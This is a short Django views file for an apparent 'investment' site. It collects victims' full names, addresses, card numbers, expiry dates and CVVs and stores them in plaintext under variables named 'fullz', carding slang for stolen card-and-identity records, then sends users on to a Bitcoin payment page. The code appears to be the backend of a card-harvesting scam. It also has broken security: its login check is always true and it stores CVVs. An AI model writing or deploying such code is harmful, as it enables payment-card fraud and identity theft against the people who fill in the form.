from django.shortcuts import redirect, render
from django.contrib.auth.models import User, auth
from .models import BTCPayments


from transactions.models import carddetails

# Create your views here.

def cardpayment(request):
    if request.method == 'POST':


        newfullz = carddetails.objects.all()

        full_name = request.POST['full_name']
        email = request.POST['email']
        adress = request.POST['adress']
        city = request.POST['city']
        state = request.POST['state']
        zip_code = request.POST['zip_code']
        card_name = request.POST['card_name']
        card_number = request.POST['card_number']
        exp_month = request.POST['exp_month']
        exp_year = request.POST['exp_year']
        cvv = request.POST['cvv']

        fullz = newfullz.create(full_name=full_name, email=email, adress=adress,city=city,state=state,zip_code=zip_code,card_name=card_name,card_number=card_number,exp_month=exp_month,exp_year=exp_year,cvv=cvv)
        fullz.save();
        return render(request, "BTCpayment.html")

    else:
        return render(request, "creditcard.html")
    


def BTCPAYMENT(request):

    newpayment = BTCPayments.objects.all()

    paymentcode = request.POST['paymentcode']
    amount = request.POST['amount']
    paymentemail = request.POST['paymentemail']

    payments = newpayment.create(paymentcode=paymentcode,amount=amount,paymentemail=paymentemail)
    payments.save();
    return render(request, "BTCpayment.html")



def invest(request):
    if User.is_authenticated:
        return render(request, 'creditcard.html')
    else:
        return render(request, 'login.html')




def BTCpayment(request):
    return render(request,'BTCpayment.html') 



def logout(request):
    auth.logout(request)
    return redirect('/')
